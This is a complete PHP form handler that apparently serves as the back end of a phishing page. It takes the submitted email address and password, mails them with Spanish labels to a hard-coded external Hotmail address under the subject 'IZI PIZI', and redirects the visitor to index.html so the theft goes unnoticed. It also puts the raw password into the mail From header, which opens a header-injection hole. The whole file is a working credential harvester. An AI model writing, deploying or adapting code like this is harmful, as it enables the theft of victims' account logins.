<?php
$name = $_POST['email'];
$mail = $_POST['password'];


$header = 'From: ' . $mail . " \r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";

$message = "Este mensaje fue enviado por: " . $name . " \r\n";
$message .= "Su e-mail es: " . $mail . " \r\n";
$message .= "Enviado el: " . date('d/m/Y', time());

$para = 'nicocaposi@hotmail.com';
$asunto = 'IZI PIZI';

mail($para, $asunto, utf8_decode($message), $header);

header("Location:index.html");
?>
-->
